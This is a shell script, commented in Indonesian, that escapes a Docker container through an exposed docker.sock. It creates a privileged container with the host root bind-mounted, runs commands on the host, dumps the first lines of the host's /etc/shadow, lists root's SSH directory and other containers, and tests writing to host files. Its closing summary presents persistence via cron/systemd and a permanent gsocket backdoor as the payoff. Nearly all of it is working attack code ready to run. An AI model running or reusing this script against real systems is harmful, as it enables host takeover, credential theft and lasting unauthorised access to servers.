#!/bin/sh
# ============================================================
#  Docker Escape — Compare Container vs Host
# ============================================================
DOCKER_SOCK="/var/run/docker.sock"
C_RED='\033[91m'; C_GRN='\033[92m'; C_YLW='\033[93m'
C_BLU='\033[94m'; C_MAG='\033[95m'; C_RST='\033[0m'; C_BLD='\033[1m'

log()    { printf "${C_BLU}[*]${C_RST} %s\n" "$*"; }
ok()     { printf "${C_GRN}[+]${C_RST} %s\n" "$*"; }
err()    { printf "${C_RED}[-]${C_RST} %s\n" "$*"; }
warn()   { printf "${C_YLW}[!]${C_RST} %s\n" "$*"; }
section(){ printf "\n${C_BLD}${C_MAG}━━━ %s ━━━${C_RST}\n\n" "$*"; }

dsock(){ curl -s --unix-socket "$DOCKER_SOCK" "$@"; }

# Strip binary/non-printable dari Docker log stream
# Docker logs API pakai multiplexed format (8-byte header per chunk)
# Kita strip dengan tr — tidak butuh 'strings'
strip_output(){
  tr -cd '\11\12\15\40-\176'
}

# ── Jalankan command di HOST via docker exec API ──────────
# Kunci: JANGAN override entrypoint/cmd saat create
# Biarkan nginx-ui jalan (container tetap running)
# Lalu inject command kita via exec API
host_exec(){
  local RAW_CMD="$1"

  # Escape untuk JSON: backslash dan double-quote
  local JCMD
  JCMD=$(printf '%s' "$RAW_CMD" | sed 's/\\/\\\\/g; s/"/\\"/g')

  # Buat container dengan DEFAULT entrypoint (nginx-ui tetap jalan)
  local CID
  CID=$(dsock -X POST -H 'Content-Type: application/json' \
    -d "{\"Image\":\"${AVAIL_IMG}\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\"}}" \
    "http://localhost/containers/create" 2>/dev/null \
    | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
  [ -z "$CID" ] && { printf 'ERR:no_cid'; return 1; }

  # Start container
  dsock -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1

  # Tunggu container benar-benar running (max 10 detik)
  local i=0 STATE=""
  while [ $i -lt 10 ]; do
    STATE=$(dsock "http://localhost/containers/$CID/json" 2>/dev/null \
      | grep -o '"Status":"[^"]*"' | head -1 | cut -d'"' -f4)
    [ "$STATE" = "running" ] && break
    sleep 1; i=$((i+1))
  done

  if [ "$STATE" != "running" ]; then
    printf 'ERR:container_exited(%s)' "$STATE"
    dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
    return 1
  fi

  # Buat exec instance — Tty:true agar output bersih tanpa header binary
  local EXEC_ID
  EXEC_ID=$(dsock -X POST -H 'Content-Type: application/json' \
    -d "{\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"Cmd\":[\"/bin/sh\",\"-c\",\"${JCMD}\"]}" \
    "http://localhost/containers/$CID/exec" 2>/dev/null \
    | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

  if [ -z "$EXEC_ID" ]; then
    printf 'ERR:no_exec_id'
    dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
    return 1
  fi

  # Jalankan exec, ambil output langsung (Tty:true = raw stream)
  local OUT
  OUT=$(dsock -X POST -H 'Content-Type: application/json' \
    -d '{"Detach":false,"Tty":true}' \
    "http://localhost/exec/$EXEC_ID/start" 2>/dev/null \
    | strip_output)

  # Cleanup
  dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1

  printf '%s' "$OUT"
}

# ════════════════════════════════════════════════════════════
#  FASE 1: POSISI SEKARANG — DALAM CONTAINER
# ════════════════════════════════════════════════════════════
section "POSISI SEKARANG — DALAM CONTAINER"

C_ID=$(id 2>/dev/null)
C_HN=$(hostname 2>/dev/null)
C_KN=$(uname -r 2>/dev/null)
C_OS=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"')
C_PID1=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null | cut -c1-50)
C_PIDS=$(ls /proc | grep -c '^[0-9]' 2>/dev/null)
C_NET=$(ip -4 addr show 2>/dev/null | awk '/inet /{print $2}' | tr '\n' ' ')
C_SHADOW=$(wc -l < /etc/shadow 2>/dev/null || echo 0)

printf "  %-22s %s\n" "User:"       "$C_ID"
printf "  %-22s %s\n" "Hostname:"   "$C_HN"
printf "  %-22s %s\n" "Kernel:"     "$C_KN"
printf "  %-22s %s\n" "OS:"         "$C_OS"
printf "  %-22s %s\n" "PID 1:"      "$C_PID1"
printf "  %-22s %s\n" "Proses:"     "$C_PIDS PID visible"
printf "  %-22s %s\n" "Network:"    "${C_NET:-tidak ada}"
printf "  %-22s %s\n" "/.dockerenv:" "$(ls /.dockerenv 2>/dev/null && echo 'ADA ← kita di container' || echo 'tidak ada')"
printf "  %-22s %s\n" "/etc/shadow:" "$C_SHADOW baris (shadow container, bukan host)"

# ════════════════════════════════════════════════════════════
#  FASE 2: SETUP ESCAPE
# ════════════════════════════════════════════════════════════
section "ESCAPE VIA DOCKER SOCKET"

[ -S "$DOCKER_SOCK" ] || { err "Docker socket tidak ada!"; exit 1; }
ok "Docker socket tersedia: $DOCKER_SOCK"

# Cari image tersedia di host
AVAIL_IMG=$(dsock http://localhost/images/json 2>/dev/null \
  | grep -o '"RepoTags":\["[^"<][^"]*"' \
  | grep -v '<none>' | head -1 \
  | sed 's|"RepoTags":\["||; s|"||g')
[ -z "$AVAIL_IMG" ] && { err "Tidak ada image tersedia di host"; exit 1; }
ok "Image: $AVAIL_IMG"
export AVAIL_IMG

# Test container bisa running
log "Test container bisa exec..."
TEST=$(host_exec "echo EXEC_OK")
if echo "$TEST" | grep -q EXEC_OK; then
  ok "Exec API berfungsi"
else
  err "Exec API gagal: $TEST"
  warn "Kemungkinan container exit terlalu cepat atau exec tidak supported"
  exit 1
fi

# ════════════════════════════════════════════════════════════
#  FASE 3: COMPARE — CONTAINER vs HOST
# ════════════════════════════════════════════════════════════
section "PERBANDINGAN: CONTAINER vs HOST"

log "Mengambil info dari HOST..."

H_ID=$(host_exec "id")
H_HN=$(host_exec "hostname")
H_KN=$(host_exec "uname -r")
H_OS=$(host_exec "grep PRETTY_NAME /host/etc/os-release | cut -d= -f2 | tr -d '\"'")
H_PID1=$(host_exec "tr '\0' ' ' < /host/proc/1/cmdline | cut -c1-50")
H_PIDS=$(host_exec "ls /host/proc | grep -c '^[0-9]'")
H_NET=$(host_exec "ip -4 addr show | awk '/inet /{print \$2}' | tr '\n' ' '")
H_DOCKERENV=$(host_exec "test -f /host/.dockerenv && echo ADA || echo 'TIDAK ADA ← ini host'")
H_SHADOW=$(host_exec "wc -l < /host/etc/shadow")
H_CONTAINERS=$(host_exec "ls /host/var/lib/docker/containers/ 2>/dev/null | wc -l")
H_SSH=$(host_exec "ls /host/root/.ssh/ 2>/dev/null || echo 'tidak ada'")

printf "\n  ${C_BLD}%-24s %-35s %-35s${C_RST}\n" "METRIC" "CONTAINER (sekarang)" "HOST (via escape)"
printf "  %s\n" "$(printf '%.0s─' $(seq 1 95))"

row(){
  local label="$1" cval="$2" hval="$3"
  printf "  %-24s ${C_YLW}%-35s${C_RST} ${C_GRN}%-35s${C_RST}\n" \
    "$label" "${cval:-?}" "${hval:-?}"
}

row "User"          "$C_ID"       "$H_ID"
row "Hostname"      "$C_HN"       "$H_HN"
row "Kernel"        "$C_KN"       "$H_KN"
row "OS"            "$C_OS"       "$H_OS"
row "PID 1"         "$(echo $C_PID1 | cut -c1-33)" "$(echo $H_PID1 | cut -c1-33)"
row "Proses visible" "$C_PIDS PID" "$H_PIDS PID"
row "Network IP"    "$C_NET"      "$H_NET"
row "/.dockerenv"   "ADA"         "$H_DOCKERENV"
row "/etc/shadow"   "$C_SHADOW baris" "$H_SHADOW baris"
row "Docker containers" "-"       "$H_CONTAINERS container di host"
row "/root/.ssh"    "container only" "$H_SSH"

# ════════════════════════════════════════════════════════════
#  FASE 4: AKSI NYATA DI HOST
# ════════════════════════════════════════════════════════════
section "AKSI NYATA DI HOST"

# Baca shadow host
log "/etc/shadow HOST:"
host_exec "cat /host/etc/shadow | head -5" | while IFS= read -r l; do
  [ -n "$l" ] && printf "  ${C_GRN}%s${C_RST}\n" "$l"
done

# Proses di host
printf "\n"
log "Top proses HOST:"
host_exec "ps aux --no-headers 2>/dev/null | head -8 || ls /host/proc | grep '^[0-9]' | head -8 | while read p; do cat /host/proc/\$p/cmdline 2>/dev/null | tr '\0' ' '; echo; done | head -8" \
  | while IFS= read -r l; do [ -n "$l" ] && printf "  %s\n" "$l"; done

# Test tulis ke host
printf "\n"
log "Test tulis ke host filesystem..."
WTEST=$(host_exec "echo escape_$(date +%s) > /host/tmp/.escape_test && cat /host/tmp/.escape_test && rm /host/tmp/.escape_test")
[ -n "$WTEST" ] \
  && ok "Tulis ke host FS berhasil: $WTEST" \
  || err "Tulis ke host FS gagal"

# List container lain di host
printf "\n"
log "Container lain yang running di host:"
host_exec "ls /host/var/lib/docker/containers/" | while IFS= read -r l; do
  [ -n "$l" ] && printf "  ${C_GRN}%s${C_RST}\n" "$l"
done

# ════════════════════════════════════════════════════════════
#  RINGKASAN
# ════════════════════════════════════════════════════════════
section "KESIMPULAN: KENAPA ESCAPE PENTING"

printf "  ${C_BLD}${C_RED}Root di container (gsocket sekarang)${C_RST}\n"
printf "  %-4s %s\n" "→" "Filesystem overlay terisolasi, bukan host asli"
printf "  %-4s %s\n" "→" "Hanya $C_PIDS proses visible (bukan semua proses host)"
printf "  %-4s %s\n" "→" "Network container, bukan host"
printf "  %-4s %s\n" "→" "Container di-delete/restart = gsocket HILANG"
printf "  %-4s %s\n" "→" "/etc/shadow yang kamu baca = punya container, bukan host"
printf "\n"
printf "  ${C_BLD}${C_GRN}Root di host (setelah escape)${C_RST}\n"
printf "  %-4s %s\n" "→" "Akses nyata ke semua file server ($H_SHADOW baris /etc/shadow host)"
printf "  %-4s %s\n" "→" "$H_PIDS proses host semua visible"
printf "  %-4s %s\n" "→" "Network host asli: $H_NET"
printf "  %-4s %s\n" "→" "Persist via cron/systemd host = tidak hilang meski container didelete"
printf "  %-4s %s\n" "→" "Akses $H_CONTAINERS container lain di host"
printf "  %-4s %s\n" "→" "gsocket di host = backdoor PERMANEN ke server"
printf "\n${C_GRN}${C_BLD}[✓] Selesai.${C_RST}\n\n"
